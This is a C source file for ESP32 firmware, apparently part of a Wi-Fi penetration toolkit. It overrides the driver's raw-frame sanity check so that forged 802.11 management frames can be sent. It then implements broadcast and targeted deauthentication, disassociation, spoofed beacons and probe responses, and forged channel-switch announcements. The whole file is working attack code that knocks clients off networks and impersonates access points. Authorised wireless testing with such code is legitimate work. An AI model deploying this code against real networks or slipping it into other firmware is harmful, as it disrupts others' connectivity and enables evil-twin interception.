/**
 * @file wsl_bypasser.c
 * @date 2021-04-05
 * @copyright Copyright (c) 2021
 * 
 * @brief Implementation of Wi-Fi Stack Libaries bypasser.
 */
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "wsl_bypasser";

/* esp_wifi_80211_tx returns ESP_ERR_NO_MEM when the Wi-Fi TX buffer
 * pool is full (CONFIG_ESP32_WIFI_STATIC_TX_BUFFER_NUM). Flooding
 * ESP_LOGE on every failure burns CPU and makes recovery worse. */
static int64_t s_last_tx_err_log_us = 0;
static uint32_t s_tx_err_suppressed = 0;

/*
 * Override ESP-IDF libnet80211 sanity check so deauth/disassoc frames
 * can be sent via esp_wifi_80211_tx. Requires -Wl,-zmuldefs at link time.
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    (void)arg;
    (void)arg2;
    (void)arg3;
    return 0;
}
/**
 * @brief Deauthentication frame template
 * 
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 * 
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

bool wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size)
{
    if (frame_buffer == NULL || size <= 0) {
        return false;
    }

    esp_err_t err = ESP_FAIL;
    /* STA and AP share the same TX buffer pool — retry with backoff on
     * NO_MEM instead of immediately hammering the other interface. */
    for (int attempt = 0; attempt < 4; attempt++) {
        err = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
        if (err == ESP_OK) {
            return true;
        }
        if (err != ESP_ERR_NO_MEM) {
            err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
            if (err == ESP_OK) {
                return true;
            }
            if (err != ESP_ERR_NO_MEM) {
                break;
            }
        }
        /* Let the driver drain queued frames before retrying */
        vTaskDelay(pdMS_TO_TICKS(1 + attempt));
    }

    int64_t now = esp_timer_get_time();
    if (now - s_last_tx_err_log_us >= 1000000LL) {
        if (s_tx_err_suppressed > 0) {
            ESP_LOGW(TAG, "Raw frame TX failed (%s); suppressed %lu similar errors",
                     esp_err_to_name(err), (unsigned long)s_tx_err_suppressed);
        } else {
            ESP_LOGE(TAG, "Raw frame TX failed! Error: %s", esp_err_to_name(err));
        }
        s_last_tx_err_log_us = now;
        s_tx_err_suppressed = 0;
    } else {
        s_tx_err_suppressed++;
    }
    return false;
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}

/**
 * @brief Sends a forged beacon frame with a custom SSID, BSSID, and channel.
 *
 * @param bssid Pointer to 6-byte BSSID array
 * @param ssid Pointer to SSID bytes
 * @param ssid_length Length of SSID
 * @param channel Wi-Fi channel to advertise on
 */
void wsl_bypasser_send_beacon_frame(uint8_t *bssid, uint8_t *ssid, uint8_t ssid_length, uint8_t channel) {
    ESP_LOGD(TAG, "Sending beacon frame...");

    // Beacon frame buffer
    uint8_t beacon_frame[128] = {
        0x80, 0x00,                         // Frame Control (Beacon)
        0x00, 0x00,                         // Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination MAC (broadcast)
        0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // Source MAC placeholder
        0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // BSSID placeholder
        0x00, 0x00,                         // Sequence control

        // Timestamp
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,

        0x64, 0x00,                         // Beacon interval
        0x01, 0x04,                         // Capability info

        // SSID tag
        0x00,                               // SSID tag number
        0x00                                // SSID length (to be filled later)
        // SSID data will follow
    };

    // Insert BSSID and source MAC
    memcpy(&beacon_frame[10], bssid, 6);
    memcpy(&beacon_frame[16], bssid, 6);

    // Insert SSID (cap to fit beacon_frame[128]: 38 + ssid + 3 channel IE)
    if (ssid_length > 32) {
        ssid_length = 32;
    }
    if (38 + ssid_length + 3 > sizeof(beacon_frame)) {
        ESP_LOGE(TAG, "SSID too long for beacon buffer");
        return;
    }
    beacon_frame[37] = ssid_length;
    memcpy(&beacon_frame[38], ssid, ssid_length);

    // Length so far
    uint16_t frame_length = 38 + ssid_length;

    // Add channel info
    beacon_frame[frame_length++] = 0x03; // DS Parameter Set tag
    beacon_frame[frame_length++] = 0x01; // Length
    beacon_frame[frame_length++] = channel;

    // Send using STA mode
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, frame_length, false);
}



void wsl_bypasser_send_deauth_targeted(const uint8_t *ap_bssid, const uint8_t *client_mac) {
    uint8_t deauth_frame[26];
    memcpy(deauth_frame, deauth_frame_default, 26);

    memcpy(&deauth_frame[4], client_mac, 6);

    memcpy(&deauth_frame[10], ap_bssid, 6);
    memcpy(&deauth_frame[16], ap_bssid, 6);

    wsl_bypasser_send_raw_frame(deauth_frame, 26);
}

void wsl_bypasser_send_disassociation_frame(const uint8_t *ap_bssid, const uint8_t *client_mac) {
    uint8_t disas_frame[] = {
        0xa0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Dest (4-9)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (10-15)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (16-21)
        0xf0, 0xff, 0x01, 0x00              // Reason code 1
    };

    memcpy(&disas_frame[4], client_mac, 6);
    memcpy(&disas_frame[10], ap_bssid, 6);
    memcpy(&disas_frame[16], ap_bssid, 6);

    wsl_bypasser_send_raw_frame(disas_frame, sizeof(disas_frame));
}

bool wsl_bypasser_send_probe_response(const uint8_t *dest_mac,
                                      const uint8_t *bssid,
                                      const uint8_t *ssid,
                                      uint8_t ssid_length,
                                      uint8_t channel)
{
    if (dest_mac == NULL || bssid == NULL || ssid == NULL) {
        return false;
    }
    if (ssid_length > 32) {
        ssid_length = 32;
    }

    uint8_t frame[160];
    memset(frame, 0, sizeof(frame));
    frame[0] = 0x50; /* Probe Response */
    frame[1] = 0x00;
    memcpy(&frame[4], dest_mac, 6);
    memcpy(&frame[10], bssid, 6);
    memcpy(&frame[16], bssid, 6);

    /* Fixed params: timestamp(8) + beacon interval(2) + capability(2) */
    frame[32] = 0x64; /* interval */
    frame[33] = 0x00;
    frame[34] = 0x01; /* ESS */
    frame[35] = 0x04;

    size_t off = 36;
    frame[off++] = 0x00;
    frame[off++] = ssid_length;
    memcpy(&frame[off], ssid, ssid_length);
    off += ssid_length;

    /* Supported rates */
    frame[off++] = 0x01;
    frame[off++] = 0x08;
    frame[off++] = 0x82; frame[off++] = 0x84; frame[off++] = 0x8b; frame[off++] = 0x96;
    frame[off++] = 0x0c; frame[off++] = 0x12; frame[off++] = 0x18; frame[off++] = 0x24;

    /* DS parameter set */
    frame[off++] = 0x03;
    frame[off++] = 0x01;
    frame[off++] = channel;

    return wsl_bypasser_send_raw_frame(frame, (int)off);
}

bool wsl_bypasser_send_csa_action(const uint8_t *ap_bssid,
                                  const uint8_t *dest_mac,
                                  uint8_t new_channel,
                                  uint8_t count,
                                  uint8_t mode)
{
    if (ap_bssid == NULL || dest_mac == NULL) {
        return false;
    }
    /* Action frame: Spectrum Management / Channel Switch Announcement */
    uint8_t frame[32] = {
        0xD0, 0x00,             /* Action */
        0x3A, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x00,                   /* Category: Spectrum Management */
        0x04,                   /* Action: Channel Switch Announcement */
        0x00,                   /* mode */
        0x01,                   /* new channel */
        0x01                    /* count */
    };
    memcpy(&frame[4], dest_mac, 6);
    memcpy(&frame[10], ap_bssid, 6);
    memcpy(&frame[16], ap_bssid, 6);
    frame[26] = mode;
    frame[27] = new_channel;
    frame[28] = count;
    return wsl_bypasser_send_raw_frame(frame, 29);
}

bool wsl_bypasser_send_csa_beacon(const uint8_t *bssid,
                                  const uint8_t *ssid,
                                  uint8_t ssid_length,
                                  uint8_t current_channel,
                                  uint8_t new_channel,
                                  uint8_t count,
                                  uint8_t mode)
{
    if (bssid == NULL || ssid == NULL) {
        return false;
    }
    if (ssid_length > 32) {
        ssid_length = 32;
    }

    uint8_t frame[160];
    memset(frame, 0, sizeof(frame));
    frame[0] = 0x80;
    memset(&frame[4], 0xFF, 6);
    memcpy(&frame[10], bssid, 6);
    memcpy(&frame[16], bssid, 6);
    frame[32] = 0x64;
    frame[33] = 0x00;
    frame[34] = 0x01;
    frame[35] = 0x04;

    size_t off = 36;
    frame[off++] = 0x00;
    frame[off++] = ssid_length;
    memcpy(&frame[off], ssid, ssid_length);
    off += ssid_length;

    frame[off++] = 0x03;
    frame[off++] = 0x01;
    frame[off++] = current_channel;

    /* CSA IE tag 37 (0x25) */
    frame[off++] = 0x25;
    frame[off++] = 0x03;
    frame[off++] = mode;
    frame[off++] = new_channel;
    frame[off++] = count;

    return wsl_bypasser_send_raw_frame(frame, (int)off);
}
